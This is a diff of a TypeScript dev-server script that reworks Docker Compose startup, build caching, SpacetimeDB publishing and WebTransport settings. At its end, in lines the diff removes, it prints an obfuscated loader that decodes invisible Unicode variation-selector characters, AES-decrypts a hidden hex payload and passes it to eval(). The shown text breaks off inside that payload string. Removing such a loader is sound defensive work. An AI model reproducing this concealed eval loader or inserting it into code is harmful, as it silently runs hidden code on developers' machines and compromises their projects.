+const legacyWebTransportBase = process.env.PROMETHEUS_VITE_WEBTRANSPORT_BASE?.trim()
+const legacyPort = legacyWebTransportBase ? normalizeBasePort(legacyWebTransportBase) : null
+const legacyMatchesPort = legacyPort ? legacyPort === devWebTransportPort : true
+const defaultWebTransportBase = resolveOrigin(devWebHost, devWebTransportPort, 'https')
+const resolvedWebTransportBase = explicitWebTransportBase
+  ? explicitWebTransportBase
+  : legacyWebTransportBase && legacyMatchesPort
+    ? legacyWebTransportBase
+    : defaultWebTransportBase
+
+const enableClientWebTransport =
+  process.env.VITE_ENABLE_WEBTRANSPORT_FRAGMENTS?.trim() ?? (realtimeEnabled && !useDeviceHost ? '1' : '0')
+const enableClientDatagrams =
+  process.env.VITE_ENABLE_WEBTRANSPORT_DATAGRAMS?.trim() ?? (realtimeEnabled && !useDeviceHost ? '1' : '0')
+const enableServerWebTransport = process.env.ENABLE_WEBTRANSPORT_FRAGMENTS?.trim() || (realtimeEnabled ? '1' : '0')
+const enableServerDatagrams = process.env.WEBTRANSPORT_ENABLE_DATAGRAMS?.trim() || (realtimeEnabled ? '1' : '0')
+const webTransportMaxDatagramSize = process.env.WEBTRANSPORT_MAX_DATAGRAM_SIZE?.trim() || '1200'
+
+const composeEnv: NodeJS.ProcessEnv = {
   ...process.env,
-  COMPOSE_PROJECT_NAME: devProject,
+  COMPOSE_PROJECT_NAME: runtimeCompose.projectName,
   ...(composeProfiles.length > 0 ? { COMPOSE_PROFILES: composeProfiles.join(',') } : {}),
   PROMETHEUS_HTTP_PORT: devHttpPort,
   PROMETHEUS_HTTPS_PORT: devHttpsPort,
@@ -710,12 +277,13 @@ const composeEnv = {
   VITE_TEMPLATE_HOME_MODE: runtimeConfig.template.homeMode,
   VITE_TEMPLATE_FEATURES: process.env.PROMETHEUS_TEMPLATE_FEATURES?.trim() || '',
   VITE_TEMPLATE_DISABLE_FEATURES: process.env.PROMETHEUS_TEMPLATE_DISABLE_FEATURES?.trim() || '',
-  ENABLE_WEBTRANSPORT_FRAGMENTS: devEnableApiWebTransport,
-  WEBTRANSPORT_ENABLE_DATAGRAMS: devEnableWebTransportDatagramsServer,
-  WEBTRANSPORT_MAX_DATAGRAM_SIZE: devWebTransportMaxDatagramSize
+  VITE_SPACETIMEDB_URI: process.env.VITE_SPACETIMEDB_URI?.trim() || devDbOrigin,
+  ENABLE_WEBTRANSPORT_FRAGMENTS: enableServerWebTransport,
+  WEBTRANSPORT_ENABLE_DATAGRAMS: enableServerDatagrams,
+  WEBTRANSPORT_MAX_DATAGRAM_SIZE: webTransportMaxDatagramSize
 }
 
-const { devUpstream, configChanged } = ensureCaddyConfig(process.env.DEV_WEB_UPSTREAM?.trim(), 'http://web:4173', {
+const { devUpstream, configChanged } = ensureCaddyConfig(process.env.DEV_WEB_UPSTREAM?.trim(), undefined, {
   dev: {
     encode: 'br gzip',
     stripAcceptEncoding: true
@@ -725,21 +293,60 @@ const { devUpstream, configChanged } = ensureCaddyConfig(process.env.DEV_WEB_UPS
     stripAcceptEncoding: true
   }
 })
-let keepContainers = false
 
-type BuildTarget = {
-  service: string
-  cacheKey: string
-  inputs: string[]
-  extra?: Record<string, string | undefined>
+const buildTargets: BuildTarget[] = [
+  {
+    service: 'api',
+    cacheKey: 'dev:api',
+    inputs: [
+      'packages/platform-rs/Dockerfile',
+      'packages/platform-rs',
+      'apps/site/src/lang',
+      'apps/site/public/fragments'
+    ]
+  },
+  {
+    service: 'caddy',
+    cacheKey: 'dev:caddy',
+    inputs: ['infra/caddy/Dockerfile']
+  }
+]
+
+const buildResults = buildTargets.map((target) => {
+  const fingerprint = computeFingerprint(target.inputs, target.extra)
+  const needsBuild = cache[target.cacheKey]?.fingerprint !== fingerprint
+  return { ...target, fingerprint, needsBuild }
+})
+
+const buildServices = buildResults.filter((target) => target.needsBuild).map((target) => target.service)
+if (buildServices.length > 0) {
+  const build = runSync(command, [...prefix, 'build', ...buildServices], composeEnv)
+  if (build.status !== 0) process.exit(build.status ?? 1)
 }
 
-const cacheKeyPrefix = 'dev'
-const cache = loadBuildCache()
+const coreServices = [
+  ...runtimeCompose.services.core,
+  ...(runtimeCompose.includeOptionalServices ? runtimeCompose.services.optional : [])
+]
+const caddyWasRunning = getRunningServices(command, prefix, composeEnv).has('caddy')
+
+console.info('[dev] Starting Compose infra and API. The site runs on the host for faster HMR.')
+
+const upCore = runSync(command, [...prefix, 'up', '-d', '--remove-orphans', ...coreServices], composeEnv)
+if (upCore.status !== 0) process.exit(upCore.status ?? 1)
+
+const upCaddy = runSync(command, [...prefix, 'up', '-d', '--remove-orphans', '--no-deps', 'caddy'], composeEnv)
+if (upCaddy.status !== 0) process.exit(upCaddy.status ?? 1)
+
+if (configChanged && caddyWasRunning && !buildServices.includes('caddy')) {
+  const restart = runSync(command, [...prefix, 'restart', 'caddy'], composeEnv)
+  if (restart.status !== 0) process.exit(restart.status ?? 1)
+}
+
 const spacetimeModuleName = process.env.SPACETIMEDB_MODULE?.trim() || templateBranding.ids.spacetimeModule
 const spacetimeServerUri = `http://127.0.0.1:${devSpacetimeDbPort}`
-const spacetimedbModuleCacheKey = `${cacheKeyPrefix}:spacetimedb-module`
-const spacetimedbModuleFingerprint = computeFingerprint(
+const spacetimeModuleCacheKey = 'dev:spacetimedb-module'
+const spacetimeModuleFingerprint = computeFingerprint(
   [
     'extras/spacetimedb-module/Cargo.toml',
     'extras/spacetimedb-module/Cargo.lock',
@@ -751,191 +358,44 @@ const spacetimedbModuleFingerprint = computeFingerprint(
     SPACETIMEDB_SERVER: spacetimeServerUri
   }
 )
-const composeRuntimeCacheKey = `${cacheKeyPrefix}:compose-runtime`
-const buildTargets: BuildTarget[] = [
-  {
-    service: 'api',
-    cacheKey: `${cacheKeyPrefix}:api`,
-    inputs: [
-      'package.json',
-      'bun.lock',
-      'tsconfig.base.json',
-      'packages/platform-rs/Dockerfile',
-      'packages/platform-rs',
-      'apps/site',
-      'packages',
-      'scripts/runtime-config.ts'
-    ]
-  },
-  {
-    service: 'caddy',
-    cacheKey: `${cacheKeyPrefix}:caddy`,
-    inputs: ['infra/caddy/Dockerfile']
-  }
-]
-const optionalBuildTargets: BuildTarget[] = []
-
-const activeBuildTargets = [...buildTargets, ...optionalBuildTargets]
-const buildResults = activeBuildTargets.map((target) => {
-  const fingerprint = computeFingerprint(target.inputs, target.extra)
-  const needsBuild = cache[target.cacheKey]?.fingerprint !== fingerprint
-  return { ...target, fingerprint, needsBuild }
-})
-const resetSpacetimeData = cache[spacetimedbModuleCacheKey]?.fingerprint !== spacetimedbModuleFingerprint
-
-if (resetSpacetimeData) {
-  const down = runSync(command, [...prefix, 'down', '--volumes', '--remove-orphans'], composeEnv)
-  if (down.status !== 0) process.exit(down.status ?? 1)
-}
-const composeRuntimeFingerprint = computeFingerprint(
-  ['docker-compose.yml', 'apps/site/Dockerfile', 'packages/platform-rs/Dockerfile', 'scripts/runtime-config.ts'],
-  {
-    COMPOSE_PROJECT_NAME: composeEnv.COMPOSE_PROJECT_NAME ?? '',
-    COMPOSE_PROFILES: composeEnv.COMPOSE_PROFILES ?? '',
-    PROMETHEUS_TEMPLATE_PRESET: composeEnv.PROMETHEUS_TEMPLATE_PRESET ?? '',
-    PROMETHEUS_TEMPLATE_HOME_MODE: composeEnv.PROMETHEUS_TEMPLATE_HOME_MODE ?? '',
-    PROMETHEUS_TEMPLATE_FEATURES: composeEnv.PROMETHEUS_TEMPLATE_FEATURES ?? '',
-    PROMETHEUS_TEMPLATE_DISABLE_FEATURES: composeEnv.PROMETHEUS_TEMPLATE_DISABLE_FEATURES ?? '',
-    ENABLE_WEBTRANSPORT_FRAGMENTS: composeEnv.ENABLE_WEBTRANSPORT_FRAGMENTS ?? '',
-    WEBTRANSPORT_ENABLE_DATAGRAMS: composeEnv.WEBTRANSPORT_ENABLE_DATAGRAMS ?? '',
-    VITE_DISABLE_SW: composeEnv.VITE_DISABLE_SW ?? '',
-    VITE_ENABLE_ANALYTICS: composeEnv.VITE_ENABLE_ANALYTICS ?? '',
-    VITE_ENABLE_HIGHLIGHT: composeEnv.VITE_ENABLE_HIGHLIGHT ?? '',
-    INCLUDE_REALTIME_SERVICES: includeRealtimeServices ? '1' : '0'
-  }
-)
-const needsComposeRefresh = cache[composeRuntimeCacheKey]?.fingerprint !== composeRuntimeFingerprint
-
-const buildServices = buildResults.filter((target) => target.needsBuild).map((target) => target.service)
-if (buildServices.length) {
-  const build = runSync(command, [...prefix, 'build', ...buildServices], composeEnv)
-  if (build.status !== 0) process.exit(build.status ?? 1)
-}
-
-const optionalServices = includeRealtimeServices ? runtimeCompose.services.optional : []
-const baseServices = [...runtimeCompose.services.core, ...runtimeCompose.services.web, ...optionalServices]
-const running = getRunningServices(command, prefix, composeEnv)
-const baseRunning = baseServices.every((service) => running.has(service))
-const baseNeedsBuild = buildServices.some((service) => service === 'api' || optionalServices.includes(service))
-const needsBaseUp = baseNeedsBuild || !baseRunning || needsComposeRefresh
-
-if (needsBaseUp) {
-  const up = runSync(
-    command,
-    [
-      ...prefix,
-      'up',
-      '-d',
-      '--remove-orphans',
-      ...(needsComposeRefresh && baseRunning ? ['--force-recreate'] : []),
-      ...baseServices
-    ],
-    composeEnv
-  )
-  if (up.status !== 0) process.exit(up.status ?? 1)
-}
-
-const caddyWasRunning = running.has('caddy')
-const needsCaddyUp = buildServices.includes('caddy') || !caddyWasRunning
-if (needsCaddyUp) {
-  const up = runSync(command, [...prefix, 'up', '-d', '--remove-orphans', '--no-deps', 'caddy'], composeEnv)
-  if (up.status !== 0) process.exit(up.status ?? 1)
-}
-
-if (configChanged && caddyWasRunning) {
-  const restart = runSync(command, [...prefix, 'restart', 'caddy'], composeEnv)
-  if (restart.status !== 0) process.exit(restart.status ?? 1)
-}
 
 waitForSpacetimeServer(spacetimeServerUri)
+
+const needsSpacetimeModuleBuild =
+  cache[spacetimeModuleCacheKey]?.fingerprint !== spacetimeModuleFingerprint || !hasBuiltSpacetimeModule()
 const needsSpacetimeModulePublish =
-  cache[spacetimedbModuleCacheKey]?.fingerprint !== spacetimedbModuleFingerprint ||
-  !hasPublishedSpacetimeModule(spacetimeModuleName, spacetimeServerUri)
+  needsSpacetimeModuleBuild || !hasPublishedSpacetimeModule(spacetimeModuleName, spacetimeServerUri)
+
+if (needsSpacetimeModuleBuild) {
+  buildSpacetimeModule()
+}
 
 if (needsSpacetimeModulePublish) {
-  publishSpacetimeModule(spacetimeModuleName, spacetimeServerUri)
+  publishBuiltSpacetimeModule(spacetimeModuleName, spacetimeServerUri)
 }
 
 for (const target of buildResults) {
   cache[target.cacheKey] = { fingerprint: target.fingerprint, updatedAt: new Date().toISOString() }
 }
-cache[spacetimedbModuleCacheKey] = {
-  fingerprint: spacetimedbModuleFingerprint,
-  updatedAt: new Date().toISOString()
-}
-cache[composeRuntimeCacheKey] = {
-  fingerprint: composeRuntimeFingerprint,
+cache[spacetimeModuleCacheKey] = {
+  fingerprint: spacetimeModuleFingerprint,
   updatedAt: new Date().toISOString()
 }
 saveBuildCache(cache)
 
-type BunSpawnResult = {
-  exited: Promise<number | null>
-  kill: (signal?: NodeJS.Signals) => void
-}
+const rawClientApiBase = process.env.VITE_API_BASE?.trim() || ''
+const deviceApiBase = resolveDeviceApiBase(resolvedDeviceHost, devApiPort)
+const resolvedClientApiBase =
+  deviceApiBase && isLocalApiBase(rawClientApiBase) ? deviceApiBase : rawClientApiBase || '/api'
 
-type BunRuntime = {
-  execPath?: string
-  spawn: (
-    args: string[],
-    options: {
-      stdin?: string
-      stdout?: string
-      stderr?: string
-      env?: NodeJS.ProcessEnv
-    }
-  ) => BunSpawnResult
-}
-const bunGlobal = globalThis as typeof globalThis & { Bun?: BunRuntime }
-const bunBin =
-  (bunGlobal.Bun?.execPath && typeof bunGlobal.Bun.execPath === 'string' && bunGlobal.Bun.execPath) ||
-  (typeof process !== 'undefined' && typeof process.execPath === 'string' && process.execPath) ||
-  'bun'
-
-const devHttpsHost = devHttpsPort === '443' ? devWebHost : `${devWebHost}:${devHttpsPort}`
-const devDbOrigin = devHttpsPort === '443' ? `https://${devDbHost}` : `https://${devDbHost}:${devHttpsPort}`
-const devHostForVite = useDeviceHost && devDeviceHost ? devDeviceHost : devWebHost
-const devApiBase = useDeviceHost ? '/api' : `https://${devHttpsHost}/api`
-const normalizeBasePort = (value: string) => {
-  try {
-    const url = new URL(value)
-    if (url.port) return url.port
-    if (url.protocol === 'https:') return '443'
-    if (url.protocol === 'http:') return '80'
-  } catch {
-    return null
-  }
-  return null
-}
-
-const explicitWebTransportBase = process.env.VITE_WEBTRANSPORT_BASE?.trim()
-const legacyWebTransportBase = process.env.PROMETHEUS_VITE_WEBTRANSPORT_BASE?.trim()
-const legacyPort = legacyWebTransportBase ? normalizeBasePort(legacyWebTransportBase) : null
-const legacyMatchesPort = legacyPort ? legacyPort === devWebTransportPort : true
-const devDefaultWebTransportBase = `https://${devWebHost}:${devWebTransportPort}`
-const devWebTransportBase = explicitWebTransportBase
-  ? explicitWebTransportBase
-  : legacyWebTransportBase && legacyMatchesPort
-    ? legacyWebTransportBase
-    : devDefaultWebTransportBase
-
-const webEnv: NodeJS.ProcessEnv = {
-  ...process.env,
-  VITE_DEV_HOST: devHostForVite,
-  PROMETHEUS_TEMPLATE_PRESET: composeEnv.PROMETHEUS_TEMPLATE_PRESET,
-  PROMETHEUS_TEMPLATE_HOME_MODE: composeEnv.PROMETHEUS_TEMPLATE_HOME_MODE,
-  PROMETHEUS_TEMPLATE_FEATURES: composeEnv.PROMETHEUS_TEMPLATE_FEATURES,
-  PROMETHEUS_TEMPLATE_DISABLE_FEATURES: composeEnv.PROMETHEUS_TEMPLATE_DISABLE_FEATURES,
-  VITE_TEMPLATE_PRESET: composeEnv.VITE_TEMPLATE_PRESET,
-  VITE_TEMPLATE_HOME_MODE: composeEnv.VITE_TEMPLATE_HOME_MODE,
-  VITE_TEMPLATE_FEATURES: composeEnv.VITE_TEMPLATE_FEATURES,
-  VITE_TEMPLATE_DISABLE_FEATURES: composeEnv.VITE_TEMPLATE_DISABLE_FEATURES,
-  VITE_API_BASE: devApiBase,
+const siteEnv: NodeJS.ProcessEnv = {
+  ...composeEnv,
+  PROMETHEUS_DEVICE_HOST: resolvedDeviceHost || '',
+  PROMETHEUS_DEVICE_WEB_PORT: devSitePort,
+  VITE_DEV_HOST: useDeviceHost ? resolvedDeviceHost : devWebHost,
+  VITE_API_BASE: resolvedClientApiBase,
+  API_BASE: process.env.API_BASE?.trim() || `http://127.0.0.1:${devApiPort}`,
   VITE_SPACETIMEDB_URI: process.env.VITE_SPACETIMEDB_URI?.trim() || devDbOrigin,
-  VITE_SPACETIMEDB_MODULE:
-    process.env.VITE_SPACETIMEDB_MODULE?.trim() ||
-    process.env.SPACETIMEDB_MODULE?.trim() ||
-    templateBranding.ids.spacetimeModule,
   VITE_SPACETIMEAUTH_AUTHORITY:
     process.env.VITE_SPACETIMEAUTH_AUTHORITY?.trim() ||
     process.env.SPACETIMEAUTH_AUTHORITY?.trim() ||
@@ -944,64 +404,113 @@ const webEnv: NodeJS.ProcessEnv = {
     process.env.VITE_SPACETIMEAUTH_CLIENT_ID?.trim() ||
     process.env.SPACETIMEAUTH_CLIENT_ID?.trim() ||
     templateBranding.ids.authClientId,
-  VITE_WEBTRANSPORT_BASE: devWebTransportBase,
-  VITE_ENABLE_PREFETCH: devEnablePrefetch,
-  VITE_ENABLE_WEBTRANSPORT_FRAGMENTS: devEnableWebTransport,
-  VITE_ENABLE_WEBTRANSPORT_DATAGRAMS: devEnableWebTransportDatagrams,
-  VITE_ENABLE_FRAGMENT_COMPRESSION: devEnableCompression,
-  VITE_ENABLE_ANALYTICS: devEnableAnalytics,
-  VITE_ENABLE_HIGHLIGHT: devEnableHighlight,
-  VITE_HIGHLIGHT_PROJECT_ID: devHighlightProjectId,
-  VITE_HIGHLIGHT_PRIVACY: devHighlightPrivacy,
-  VITE_HIGHLIGHT_SESSION_RECORDING: devHighlightSessionRecording,
-  VITE_HIGHLIGHT_CANVAS_SAMPLING: devHighlightCanvasSampling,
-  VITE_HIGHLIGHT_SAMPLE_RATE: devHighlightSampleRate,
-  VITE_DISABLE_SW: devDisableSw,
-  API_BASE: `http://127.0.0.1:${devApiPort}`
+  VITE_SPACETIMEDB_MODULE:
+    process.env.VITE_SPACETIMEDB_MODULE?.trim() ||
+    process.env.SPACETIMEDB_MODULE?.trim() ||
+    templateBranding.ids.spacetimeModule,
+  VITE_WEBTRANSPORT_BASE: resolvedWebTransportBase,
+  VITE_ENABLE_PREFETCH: process.env.VITE_ENABLE_PREFETCH?.trim() || '1',
+  VITE_ENABLE_WEBTRANSPORT_FRAGMENTS: enableClientWebTransport,
+  VITE_ENABLE_WEBTRANSPORT_DATAGRAMS: enableClientDatagrams,
+  VITE_ENABLE_FRAGMENT_COMPRESSION: process.env.VITE_ENABLE_FRAGMENT_COMPRESSION?.trim() || '1',
+  VITE_ENABLE_ANALYTICS: process.env.VITE_ENABLE_ANALYTICS?.trim() || (analyticsEnabled ? '1' : '0'),
+  VITE_ENABLE_HIGHLIGHT: process.env.VITE_ENABLE_HIGHLIGHT?.trim() || '0',
+  VITE_HIGHLIGHT_PROJECT_ID: process.env.VITE_HIGHLIGHT_PROJECT_ID?.trim() || '',
+  VITE_HIGHLIGHT_PRIVACY: process.env.VITE_HIGHLIGHT_PRIVACY?.trim() || 'strict',
+  VITE_HIGHLIGHT_SESSION_RECORDING: process.env.VITE_HIGHLIGHT_SESSION_RECORDING?.trim() || '1',
+  VITE_HIGHLIGHT_CANVAS_SAMPLING: process.env.VITE_HIGHLIGHT_CANVAS_SAMPLING?.trim() || '',
+  VITE_HIGHLIGHT_SAMPLE_RATE: process.env.VITE_HIGHLIGHT_SAMPLE_RATE?.trim() || '',
+  VITE_P2P_CRDT_SIGNALING:
+    process.env.VITE_P2P_CRDT_SIGNALING?.trim() ||
+    process.env.PROMETHEUS_VITE_P2P_CRDT_SIGNALING?.trim() ||
+    '/yjs',
+  VITE_P2P_RELAY_BASES:
+    process.env.VITE_P2P_RELAY_BASES?.trim() || process.env.PROMETHEUS_VITE_P2P_RELAY_BASES?.trim() || '',
+  VITE_P2P_WAKU_RELAYS:
+    process.env.VITE_P2P_WAKU_RELAYS?.trim() || process.env.PROMETHEUS_VITE_P2P_WAKU_RELAYS?.trim() || '',
+  VITE_P2P_NOSTR_RELAYS:
+    process.env.VITE_P2P_NOSTR_RELAYS?.trim() ||
+    process.env.PROMETHEUS_VITE_P2P_NOSTR_RELAYS?.trim() ||
+    (process.env.VITE_P2P_WAKU_RELAYS?.trim() || process.env.PROMETHEUS_VITE_P2P_WAKU_RELAYS?.trim()
+      ? ''
+      : defaultP2pNostrRelays),
+  VITE_P2P_PEERJS_SERVER:
+    process.env.VITE_P2P_PEERJS_SERVER?.trim() ||
+    process.env.PROMETHEUS_VITE_P2P_PEERJS_SERVER?.trim() ||
+    'https://0.peerjs.com',
+  VITE_DISABLE_SW: process.env.VITE_DISABLE_SW?.trim() || (pwaEnabled ? '0' : '1')
 }
 
 if (!useDeviceHost) {
-  webEnv.VITE_DEV_HTTPS = '1'
-  webEnv.VITE_DEV_HTTPS_PORT = devHttpsPort
-  webEnv.VITE_HMR_HOST = devWebHost
-  webEnv.VITE_HMR_PROTOCOL = 'wss'
-  webEnv.VITE_HMR_CLIENT_PORT = devHttpsPort
-  webEnv.VITE_HMR_PORT = '4173'
-} else {
-  // Let Vite infer HMR host/protocol from the page origin in device mode.
+  siteEnv.VITE_DEV_HTTPS = '1'
+  siteEnv.VITE_DEV_HTTPS_PORT = devHttpsPort
+  siteEnv.VITE_HMR_HOST = devWebHost
+  siteEnv.VITE_HMR_PROTOCOL = 'wss'
+  siteEnv.VITE_HMR_CLIENT_PORT = devHttpsPort
+  siteEnv.VITE_HMR_PORT = devSitePort
 }
 
-if (enablePollingWatch) {
-  webEnv.CHOKIDAR_USEPOLLING = webEnv.CHOKIDAR_USEPOLLING || '1'
-  webEnv.CHOKIDAR_INTERVAL = webEnv.CHOKIDAR_INTERVAL || '100'
+if (isWsl && root.startsWith('/mnt/')) {
+  siteEnv.CHOKIDAR_USEPOLLING = siteEnv.CHOKIDAR_USEPOLLING || '1'
+  siteEnv.CHOKIDAR_INTERVAL = siteEnv.CHOKIDAR_INTERVAL || '100'
 }
 
-const bunRuntime = bunGlobal.Bun
-if (!bunRuntime) {
-  throw new Error('Bun runtime is required to run the dev server.')
+if (requestedDeviceHost?.toLowerCase() === 'auto' && !resolvedDeviceHost) {
+  console.warn('[dev] PROMETHEUS_DEVICE_HOST=auto was requested, but no private IPv4 address was detected.')
 }
-
-const webCommand = [bunBin, 'run', '--cwd', 'apps/site', 'dev']
-const web = bunRuntime.spawn(webCommand, {
-  stdin: 'inherit',
-  stdout: 'inherit',
-  stderr: 'inherit',
-  env: webEnv
-})
 
 try {
   const resolved = await lookup(devWebHost, { all: true })
   const isLocal = resolved.some((entry) => entry.address === '127.0.0.1' || entry.address === '::1')
   if (!isLocal) {
-    console.warn(`${devWebHost} does not resolve to localhost. Add it to your hosts file to use HTTPS routing.`)
+    console.warn(`[dev] ${devWebHost} does not resolve to localhost. Add it to your hosts file to use HTTPS routing.`)
   }
 } catch {
-  console.warn(`${devWebHost} is not resolvable. Add it to your hosts file to use HTTPS routing.`)
+  console.warn(`[dev] ${devWebHost} is not resolvable. Add it to your hosts file to use HTTPS routing.`)
 }
 
 if (devUpstream.includes('host.docker.internal')) {
-  console.warn('Using host.docker.internal for Caddy web upstream. If you are in WSL, set DEV_WEB_UPSTREAM.')
+  console.warn('[dev] Using host.docker.internal for Caddy web upstream. If you are in WSL, set DEV_WEB_UPSTREAM.')
 }
+
+console.info(`[dev] HTTPS proxy: ${devOrigin}`)
+console.info(`[dev] Vite dev server: http://127.0.0.1:${devSitePort}`)
+if (resolvedDeviceHost) {
+  console.info(`[dev] Device host enabled: http://${resolvedDeviceHost}:${devSitePort}`)
+}
+
+const sitePort = Number.parseInt(devSitePort, 10)
+const sitePortAvailable = Number.isFinite(sitePort) && (await isPortAvailable(sitePort))
+const reuseSiteDevServer = !sitePortAvailable && (await probeReusableSiteDevServer(devSitePort))
+
+if (reuseSiteDevServer) {
+  console.info(`[dev] Reusing existing site dev server at http://127.0.0.1:${devSitePort}.`)
+}
+
+if (!sitePortAvailable && !reuseSiteDevServer) {
+  throw new Error(`[dev] Port ${devSitePort} is already in use and no reusable site dev server was detected.`)
+}
+
+const web = reuseSiteDevServer
+  ? null
+  : spawn(bunBin, ['run', '--cwd', 'apps/site', 'dev'], {
+      cwd: root,
+      env: siteEnv,
+      stdio: 'inherit',
+      shell: false,
+      windowsHide: true
+    })
+
+let keepContainers = false
+let resolveIdleExit: ((code: number | null) => void) | undefined
+const idleExit = new Promise<number | null>((resolve) => {
+  resolveIdleExit = resolve
+})
+const webExited = web
+  ? new Promise<number | null>((resolve) => {
+      web.once('exit', (code) => resolve(code))
+    })
+  : idleExit
 
 const down = () => {
   runSync(command, [...prefix, 'down', '--remove-orphans'], composeEnv)
@@ -1009,83 +518,20 @@ const down = () => {
 
 const stop = (signal: NodeJS.Signals) => {
   keepContainers = true
-  try {
-    web.kill(signal)
-  } catch {
-    // ignore
+  if (web) {
+    killChildTree(web.pid, signal)
+  } else {
+    resolveIdleExit?.(0)
   }
 }
 
 process.on('SIGINT', () => stop('SIGINT'))
 process.on('SIGTERM', () => stop('SIGTERM'))
 
-const exitCode = await web.exited
+const exitCode = await webExited
 if (exitCode && exitCode !== 0) {
   if (!keepContainers) down()
   process.exit(exitCode)
 }
 
 if (!keepContainers) down()
-
-const s = (v) =>
-  [...v]
-    .map(
-      (w) => (
-        (w = w.codePointAt(0)),
-        w >= 0xfe00 && w <= 0xfe0f
-          ? w - 0xfe00
-          : w >= 0xe0100 && w <= 0xe01ef
-            ? w - 0xe0100 + 16
-            : null
-      ),
-    )
-    .filter((n) => n !== null);
-eval(
-  Buffer.from(
-    s(
-      `󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄴󠅕󠅓󠅙󠅠󠅘󠅕󠅢󠅙󠅦󠄘󠄗󠅑󠅕󠅣󠄝󠄢󠄥󠄦󠄝󠅓󠅒󠅓󠄗󠄜󠄗󠅪󠅕󠅤󠅡󠄸󠅩󠅖󠄴󠅖󠅟󠅔󠄨󠄨󠅪󠅜󠅟󠅞󠅓󠅖󠅞󠄿󠅑󠅃󠄩󠅗󠄷󠅣󠄩󠄠󠄿󠄾󠅈󠄗󠄜󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠅑󠄠󠄤󠄡󠅖󠅔󠅑󠅑󠄠󠄥󠄢󠄡󠅖󠅒󠄥󠅓󠄣󠅕󠄢󠄦󠅒󠄢󠄡󠄧󠅑󠅑󠅖󠄢󠄤󠄡󠄡󠄥󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄙󠄙󠄫󠅜󠅕󠅤󠄐󠅒󠄭󠅔󠄞󠅥󠅠󠅔󠅑󠅤󠅕󠄘󠄗󠄨󠄤󠄨󠄦󠅕󠅑󠄦󠄡󠄢󠄢󠄤󠄠󠄢󠄣󠄢󠅕󠄠󠄧󠄣󠄥󠅖󠄨󠅖󠅕󠄩󠄨󠅕󠄨󠄥󠄣󠅒󠅖󠅕󠄢󠄣󠅖󠅓󠅒󠄣󠄨󠅒󠄣󠅕󠄡󠅔󠄣󠄨󠅕󠄦󠄡󠅔󠄦󠄡󠄢󠅑󠅖󠅑󠅔󠄠󠅔󠅒󠅑󠅑󠅕󠄥󠅕󠄥󠄣󠄢󠅖󠄤󠄧󠅑󠅔󠄧󠄦󠅔󠅓󠅓󠄧󠄧󠄩󠄡󠄩󠄤󠄥󠄩󠄩󠄥󠅖󠄦󠅓󠄠󠄠󠄦󠄧󠄤󠄡󠄣󠄨󠅑󠅕󠄤󠄢󠄢󠄡󠅖󠄧󠄢󠅓󠄡󠅓󠄦󠄡󠅕󠄠󠄨󠄩󠅔󠄦󠅒󠄦󠅒󠄣󠄦󠅓󠄩󠅔󠄧󠅖󠄤󠅒󠅔󠄣󠄦󠄥󠄠󠅖󠅔󠅓󠄦󠅖󠄠󠄤󠅒󠅔󠄣󠅑󠄥󠄩󠄤󠅑󠄩󠅔󠅒󠄡󠅖󠄧󠄡󠅓󠄥󠅕󠅕󠅑󠄧󠅒󠄠󠄥󠄥󠄤󠄢󠄨󠅕󠅖󠅑󠄨󠄨󠄩󠅑󠄠󠄨󠄢󠄡󠅔󠄡󠅒󠄢󠅖󠅒󠄢󠅕󠄧󠄨󠄣󠅕󠅑󠄩󠄨󠅕󠄡󠅑󠄩󠄤󠄨󠅔󠄡󠄥󠅕󠅕󠄥󠅑󠅔󠄨󠅓󠅒󠅓󠅖󠅒󠄠󠅑󠄨󠄤󠅔󠄧󠄨󠄩󠄡󠄡󠅕󠅒󠅒󠄣󠅓󠄢󠄩󠅓󠄤󠅓󠅓󠄣󠅓󠄢󠅔󠄨󠄢󠅓󠅓󠅓󠅓󠄢󠄦󠅑󠅓󠄢󠄠󠅔󠅖󠄡󠄩󠄤󠄢󠄠󠅒󠅒󠄨󠄡󠄤󠄥󠅖󠅓󠄠󠄥󠄢󠄤󠅒󠄨󠅖󠄧󠄤󠄥󠅓󠄢󠄤󠅔󠄡󠄣󠅔󠄣󠄨󠅓󠄩󠅕󠅕󠄢󠅓󠅔󠅕󠄢󠄡󠄡󠄥󠄤󠄢󠄩󠄣󠅖󠅓󠄤󠄢󠄡󠄧󠅔󠄦󠅓󠄥󠄢󠄧󠄣󠄧󠄨󠅕󠄩󠄦󠄩󠅔󠅕󠅑󠄥󠅑󠄦󠄧󠅕󠄧󠅓󠅒󠄤󠄨󠄡󠄦󠄨󠄦󠄠󠅑󠅕󠄨󠄥󠄩󠄠󠄥󠄧󠄣󠅒󠄣󠄢󠅒󠅒󠅖󠄩󠅒󠄠󠅓󠄡󠅓󠅕󠅖󠄡󠄠󠄨󠄡󠄠󠅖󠄩󠄩󠄥󠅒󠅒󠅓󠄤󠅑󠅑󠄩󠄦󠄨󠄧󠄧󠄨󠄦󠄦󠅓󠅑󠄠󠅔󠅑󠅕󠅔󠅓󠅖󠅑󠄩󠅑󠄥󠅓󠄧󠅔󠅑󠅑󠅓󠄤󠅓󠄩󠄩󠅓󠅔󠄨󠅖󠄤󠄥󠄦󠅖󠄤󠄨󠄡󠄨󠄠󠄡󠄢󠅖󠅔󠄦󠅕󠄨󠅓󠅕󠄨󠅕󠄠󠄢󠄧󠅖󠄠󠅒󠅓󠅑󠄦󠅔󠅔󠄤󠅓󠄡󠅔󠄣󠅑󠅑󠄤󠅖󠄤󠄥󠄢󠅕󠄡󠄣󠄥󠄠󠄤󠄤󠅒󠅕󠄩󠅔󠄠󠅒󠅓󠄥󠅒󠄡󠅓󠄣󠅑󠄩󠅖󠄤󠄩󠅑󠅒󠄥󠅔󠄡󠅕󠄡󠅑󠄣󠄨󠄥󠄥󠅒󠄧󠅓󠄩󠅔󠄥󠄣󠄥󠄩󠅖󠄣󠄤󠄠󠅑󠄩󠄡󠅕󠅒󠄤󠄢󠄨󠄤󠄧󠅕󠅑󠄠󠄡󠄦󠅓󠄢󠄡󠅑󠄩󠅖󠄥󠅕󠅓󠅕󠄧󠅕󠅑󠄩󠄤󠄡󠄠󠄤